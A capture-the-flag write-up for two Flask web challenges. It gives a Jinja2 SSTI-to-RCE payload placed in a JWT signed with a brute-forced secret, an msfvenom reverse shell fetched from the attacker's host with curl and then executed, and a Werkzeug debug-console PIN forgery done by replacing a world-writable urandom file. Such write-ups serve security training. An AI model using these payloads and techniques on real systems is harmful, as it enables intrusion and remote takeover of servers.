# Drink from my Flask#1 [68 solves] [168 points]

After we enter the page, it shows this :

```
<h2>Invalid operation</h2><br><p>Example: /?op=substract&n1=5&n2=2</p>
```

It's showing the usage of a calculator feature, I tried to exploit it but got nothing

When I make request to an invalid route /notexist, it shows that the path is invalid and display available routes :

```
<h2>/notexist was not found</h2><br><p>Only routes / and /adminPage are available</p>
```

so / is for the calculator, and /adminPage will show that we are a 'guest' :

```
Sorry but you can't access this page, you're a 'guest'
```

So, if we enter an invalid route, it will print out our route, so I tried SSTI with /{{7*7}} and it works :

```
<h2>/49 was not found</h2><br><p>Only routes / and /adminPage are available</p>
```

However, if I use a payload that is too large, it will response with "Anormaly long payload"

So I try to find other ways for SSTI, in /adminPage it will print out 'guest', and actually it's our role in the jwt :

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww

{
  "typ": "JWT",
  "alg": "HS256"
}
{
  "role": "guest"
}
```

I tried to change the alg to "none", but it didn't work, however it used a very short secret and I can bruteforce it :

```
# jwt-cracker -t eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww
SECRET FOUND: key
Time taken (sec): 1.491
Attempts: 80000
```

The secret is 'key', so now we can change the guest to SSTI payload and see if it works :

```
{
  "role": "{{7*7}}"
}
```

```
Sorry but you can't access this page, you're a '49'
```

Then we can try to get RCE with this SSTI

```
{
  "role": "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('ls -la').read()}}{%endif%}{%endfor%}"
}
```

```
Sorry but you can't access this page, you're a 'total 16
drwxr-xr-x 1 root     root     4096 May 13 03:06 .
drwxr-xr-x 1 root     root     4096 May 13 03:06 ..
-rw-r--r-- 1 root     root     3654 May 12 10:17 app.py
-r-------- 1 www-data www-data   28 May 13 03:06 flag.txt
```

The flag.txt is in our current directory, so we can just read it :

```
{
  "role": "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('cat flag.txt').read()}}{%endif%}{%endfor%}"
}
```

Then we get the flag for part 1 :
```
Sorry but you can't access this page, you're a 'Hero{sst1_fl4v0ur3d_c0Ok1e}
```

# Drink from my Flask#2 [475 points] [25 solves]

After getting RCE, we can just get a reverse shell as www-data

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<our address> LPORT=1337 -f elf > rev
```

```
{
  "role": "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('curl http://<our address>/rev > /tmp/rev;chmod 777 /tmp/rev;/tmp/rev').read()}}{%endif%}{%endfor%}"
}
```

Then we can see there is a flaskdev user :

```
www-data@flask:/home/flaskdev$ ls -la
total 28
drwxr-xr-x 1 flaskdev flaskdev 4096 May 13 03:06 .
drwxr-xr-x 1 root     root     4096 May 13 03:06 ..
lrwxrwxrwx 1 root     root        9 May 13 03:06 .bash_history -> /dev/null
-rw-r--r-- 1 flaskdev flaskdev  220 May 13 03:06 .bash_logout
-rw-r--r-- 1 flaskdev flaskdev 3771 May 13 03:06 .bashrc
-rw-r--r-- 1 flaskdev flaskdev  807 May 13 03:06 .profile
-r-------- 1 flaskdev flaskdev   31 May 13 03:06 flag.txt
-rwxr-xr-x 1 root     root      219 May 12 10:17 reboot_flask.sh
```

We have to escalate to flaskdev in order to read the flag.txt

There is a script that will restart the app.py in /var/www/dev periodically with cron job :
```
www-data@flask:/home/flaskdev$ cat reboot_flask.sh 
if [ `ps -aux | grep -E ".*/usr/bin/python3 /var/www/dev/app.py" | wc -l` != "2" ]
then
    pkill python3 -U 1000
    /usr/bin/python3 /var/www/dev/app.py # This dev app is not exposed, it's ok to run it as myself  
fi
```

pspy64 :
```
2023/05/13 18:40:01 CMD: UID=0    PID=11064  | CRON -f 
2023/05/13 18:40:01 CMD: UID=1000 PID=11065  | /bin/sh /home/flaskdev/reboot_flask.sh 
2023/05/13 18:40:01 CMD: UID=1000 PID=11066  | /bin/sh /home/flaskdev/reboot_flask.sh 
```

Inside /var/www/, there is /var/www/app/app.py, which is the app.py we have exploited, and there is /var/www/dev/app.py

It is running as flaskdev in port 5000 locally
```
flaskdev      26  0.0  0.1  36492 30000 ?        S    18:32   0:00 /usr/bin/python3 /var/www/dev/app.py
```

/var/www/dev/app.py is not vulnerable to the SSTI, however it has the debug mode enabled, so we can use /console to execute python code and execute command as flaskdev

But first we have to get the PIN for the console first :

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug

We can use this script to calculate the PIN :

https://github.com/wdahlenburg/werkzeug-debug-console-bypass/blob/main/werkzeug-pin-bypass.py

We have to first get some information about the machine to get the PIN 

The username of the user running the flask is `flaskdev`, and the path to the flask app.py is `/usr/local/lib/python3.10/dist-packages/flask/app.py`

```python
>>> import uuid
>>> uuid.getnode()
2482665380098
```

For the machine id, the guide and the script say it will concatenate /etc/machine-id, /proc/sys/kernel/random/boot_id and /proc/self/cgroup

https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/\_\_init\_\_.py#L58-L67

However I checked the code, it will either concatenate /etc/machine-id with /proc/self/cgroup or /proc/sys/kernel/random/boot_id with /proc/self/cgroup, if /etc/machine-id has value, then the for loop will break and won't read /proc/sys/kernel/random/boot_id at all


```
www-data@flask:/var/www/app$ cat /etc/machine-id
44bf872f03b042bd9a987cbaac829007
```

```
flaskdev      23  0.1  0.1 184980 31144 ?        S    04:11   0:00 /usr/bin/python3 /var/www/dev/app.py

www-data@flask:/var/www/app$ cat /proc/23/cgroup 
0::/
```

There's nothing after the last / in /proc/self/cgroup

```
www-data@flask:/var/www/app$ cat /etc/machine-id
44bf872f03b042bd9a987cbaac829007
```

So we entered the information to the script :

```
probably_public_bits = [
	'flaskdev',# username
	'flask.app',# modname
	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/usr/local/lib/python3.10/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
	'2482665380098',# str(uuid.getnode()),  /sys/class/net/ens33/address 
	# Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
	'44bf872f03b042bd9a987cbaac829007'
]
```

However the PIN doesn't work

So I tried to write a simple flask script with debug mode enabled and run it as www-data so it will show the correct PIN, and try to use the script to calculate the PIN, and the PIN is wrong

I'm so sure that the information about the machine are correct

I discover that the PIN changed if I restart flask, so there is something wrong

I checked the code of "/usr/local/lib/python3.10/dist-packages/werkzeug/debug/\_\_init\_\_.py" :

```python
...
    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [
        str(uuid.getnode()),
        get_machine_id(),
        open("/var/www/config/urandom", "rb").read(16) # ADDING EXTRA SECURITY TO PREVENT PIN FORGING
    ]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")
...
```

It added a line to include 16 bytes of /var/www/config/urandom to private_bits, the original file does not have that

```
www-data@flask:/var/www/config$ ls -la
total 12
drwxrwxrwx 1 root     root     4096 May 14 05:07 .
drwxr-xr-x 1 root     root     4096 May 13 03:17 ..
lrwxrwxrwx 1 root     root       12 May 13 03:17 urandom -> /dev/urandom
```

Everyone has write access on that directory, so I can delete it and replace it with known data

```
rm urandom
echo "aaaaaaaaaaaaaaaa" > urandom
```

```python
probably_public_bits = [
	'flaskdev',# username
	'flask.app',# modname
	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/usr/local/lib/python3.10/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
	'2482665380098',# str(uuid.getnode()),  /sys/class/net/ens33/address 
	# Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
	'44bf872f03b042bd9a987cbaac829007',
	'aaaaaaaaaaaaaaaa'
]
```

```
# python3 werkzeug_pin.py 
Pin: 647-966-200
```

Then it works :

![](https://i.imgur.com/FATNgQQ.png)

We can just use the payload we transferred to the machine earlier to get a reverse shell as flaskdev

```
flaskdev@flask:/home/flaskdev$ id
uid=1000(flaskdev) gid=1000(flaskdev) groups=1000(flaskdev)
```

Then we can get the flag :
```
flaskdev@flask:/home/flaskdev$ ls -la
total 28
drwxr-xr-x 1 flaskdev flaskdev 4096 May 13 03:17 .
drwxr-xr-x 1 root     root     4096 May 13 03:16 ..
lrwxrwxrwx 1 root     root        9 May 13 03:16 .bash_history -> /dev/null
-rw-r--r-- 1 flaskdev flaskdev  220 May 13 03:16 .bash_logout
-rw-r--r-- 1 flaskdev flaskdev 3771 May 13 03:16 .bashrc
-rw-r--r-- 1 flaskdev flaskdev  807 May 13 03:16 .profile
-r-------- 1 flaskdev flaskdev   31 May 13 03:17 flag.txt
-rwxr-xr-x 1 root     root      219 May 12 10:16 reboot_flask.sh

flaskdev@flask:/home/flaskdev$ cat flag.txt 
Hero{n0t_s0_Urandom_4ft3r_4ll}
```